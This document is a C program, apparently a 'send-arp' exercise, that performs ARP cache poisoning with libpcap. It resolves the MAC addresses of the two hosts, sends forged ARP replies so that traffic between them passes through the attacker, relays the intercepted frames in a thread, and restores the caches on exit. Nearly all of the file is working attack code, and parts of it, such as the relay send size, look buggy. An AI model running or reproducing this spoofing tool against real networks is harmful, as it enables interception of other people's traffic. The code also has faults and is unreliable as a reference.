#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define INIT_SIZE 8

static volatile int keepRunning = 1;

typedef struct {
    uint8_t oct[6];
} mac_addr;

typedef struct {
    uint8_t oct[4];
} ip_addr;

// arp packet
typedef struct {
    mac_addr dest;
    mac_addr src;
    ushort type;
    ushort hardwareType;
    ushort protocolType;
    ushort hardware_protocolSize;
    ushort opcode;
    mac_addr senderMac;
    ip_addr senderIp;
    mac_addr targetMac;
    ip_addr targetIp;
} arp_packet;

typedef struct {
    char adapter[20];
    mac_addr mac[3];
    arp_packet packet[2];
} arp_table;

void intHandler(int dummy) {
    keepRunning = 0;
}

char* str(int size) {
	char* string = (char*)malloc(sizeof(char) * size);

	for (int i = 0; i < size; i++)
		string[i] = '\0';

	return string;
}

char** split(char *sentence, char separator) {
	char** tokens;
	int* lengths;
	int tokens_idx = 0;
	int token_idx = 0;
	int num_tokens = 1;

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator)
			(num_tokens)++;
	}

	lengths = (int*)malloc(sizeof(int) * (num_tokens));
	tokens = (char**)malloc(sizeof(char*) * (num_tokens));

	for (int i = 0; i < num_tokens; i++) {
		tokens[i] = str(INIT_SIZE);
		lengths[i] = INIT_SIZE;
	}

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator && strlen(tokens[tokens_idx]) != 0) {
			token_idx = 0;
			tokens_idx++;
		}
		else if (sentence[i] == separator && strlen(tokens[tokens_idx]) == 0){
			continue;
		}
		else {
			/* Memory reallocation, If  array is full. */

			if (strlen(tokens[tokens_idx]) == lengths[tokens_idx] - 1) {
				tokens[tokens_idx] = realloc(tokens[tokens_idx], (lengths[tokens_idx] * sizeof(char)) << 1);

				for (int j = lengths[tokens_idx]; j < lengths[tokens_idx] << 1; j++)
					tokens[tokens_idx][j] = '\0';

				lengths[tokens_idx] <<= 1;
			}

			tokens[tokens_idx][token_idx] = sentence[i];
			token_idx++;
		}
	}

	return tokens;
}


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_my_mac_address(char* interface, mac_addr* packet) {
    char path[100];
    char my_mac_address[20];
    char** my_mac_address_bytes;
    sprintf(path, "/sys/class/net/%s/address", interface);
    FILE* fp = fopen(path, "r");
    if (fp == NULL) {
        printf("failed to open %s\n", path);
        return;
    }
    fscanf(fp, "%s", my_mac_address);
    my_mac_address_bytes = split(my_mac_address, ':');
    for(int i = 0; i < 6; i++) packet->oct[i] = (uint8_t)strtol(my_mac_address_bytes[i], NULL, 16);
    fclose(fp);
}

void get_my_ip_address(char* interface, arp_packet* packet) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);
    char** tmp = split(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), '.');
    for(int i = 0; i < 4; i++) packet->senderIp.oct[i] = atoi(tmp[i]);
}

void *arp_thread(void* packet) {
    arp_table* table = (arp_table*)packet;
    pcap_t* handle = pcap_open_live(table->adapter, BUFSIZ, 1, 1000, NULL);
    mac_addr mac;
    if (handle == NULL) {
        printf("failed to open %s\n", table->adapter);
        return NULL;
    }
    while(keepRunning) {
        struct pcap_pkthdr* header;
        u_char* res;
        pcap_next_ex(handle, &header, &res);
        mac = *((mac_addr*)(res + 6));
        for(int i = 0; i < 2; i++)
            if(table->mac[i].oct[0] == mac.oct[0] && table->mac[i].oct[1] == mac.oct[1] && table->mac[i].oct[2] == mac.oct[2] && table->mac[i].oct[3] == mac.oct[3] && table->mac[i].oct[4] == mac.oct[4] && table->mac[i].oct[5] == mac.oct[5]) {
                for(int j = 0; j < 6; j++) {
                    res[6 + j] = table->mac[i + ((i - 1) * -1) + 1].oct[j];
                }
                pcap_sendpacket(handle, (const u_char*)&res, sizeof(res));
            }
        if(res[12] == 0x08 && res[13] == 0x06 && res[21] == 0x01) {
                for(int i = 0; i < 2; i++)
                    pcap_sendpacket(handle, (const u_char*)&table->packet[i], sizeof(table->packet[i]));
        }
        res = NULL;
    }
    return NULL;
}


int main(int argc, char* argv[]) {
    signal(SIGINT, intHandler);
    if (argc == 2 || argc % 2) {
		usage();
		return -1;
	}
    pthread_t *arp_threads = (pthread_t*)malloc(sizeof(pthread_t) * ((argc - 2) / 2));
    arp_table table;
    strncpy(table.adapter, argv[1], 20);
    for(int i = 2; i < argc - 1; i+=2) {
        char** tmp;
        pcap_t* handle = pcap_open_live(table.adapter, BUFSIZ, 1, 1000, NULL);
        if (handle == NULL) {
            printf("failed to open %s\n", table.adapter);
            return -1;
        }
        
        struct pcap_pkthdr* header;

        get_my_mac_address(table.adapter, &table.mac[0]);

        for(int k = 0; k < 2; k++){
            const u_char* res;
            for(int j = 0; j < 6; j++) table.packet[k].dest.oct[j] = 0xff;
            table.packet[k].src = table.mac[0];
            table.packet[k].type = htons(0x0806);
            table.packet[k].hardwareType = htons(0x0001);
            table.packet[k].protocolType = htons(0x0800);
            table.packet[k].hardware_protocolSize = htons(0x0604);
            table.packet[k].opcode = htons(0x0001);
            table.packet[k].senderMac = table.mac[0];
            get_my_ip_address(table.adapter, &table.packet[k]);
            for(int j = 0; j < 6; j++) table.packet[k].targetMac.oct[j] = 0x00;
            tmp = split(argv[i + k], '.');
            for(int j = 0; j < 4; j++) table.packet[k].targetIp.oct[j] = atoi(tmp[j]);
            
            pcap_sendpacket(handle, (const u_char*)&table.packet[k], sizeof(table.packet[k]));
            pcap_next_ex(handle, &header, &res);
            res += 6;

            table.packet[k].opcode = htons(0x0002);
            table.mac[k + 1] = *((mac_addr*)res);
            table.packet[k].dest = table.mac[k + 1];
            table.packet[k].targetMac = table.mac[k + 1];
            tmp = split(argv[i + ((k - 1) * -1)], '.');
            for(int j = 0; j < 4; j++) table.packet[k].senderIp.oct[j] = atoi(tmp[j]);
            pcap_sendpacket(handle, (const u_char*)&table.packet[k], sizeof(table.packet[k]));
        }

        int thread_res = pthread_create(&arp_threads[i / 2 - 1], NULL, arp_thread, (void*)&table);
        if(thread_res < 0) {
            printf("error");
        }
        

        pcap_close(handle);
    }
    while(keepRunning) {
        sleep(1);
    }
    pcap_t* handle = pcap_open_live(table.adapter, BUFSIZ, 1, 1000, NULL);
    for(int i = 0; i < 6; i++) {
        table.packet[0].senderMac.oct[i] = table.mac[2].oct[i];
        table.packet[1].senderMac.oct[i] = table.mac[1].oct[i];
    }
    for(int i = 0; i < 2; i++) pcap_sendpacket(handle, (const u_char*)&table.packet[i], sizeof(table.packet[i]));
    pcap_close(handle);
    return 0;
}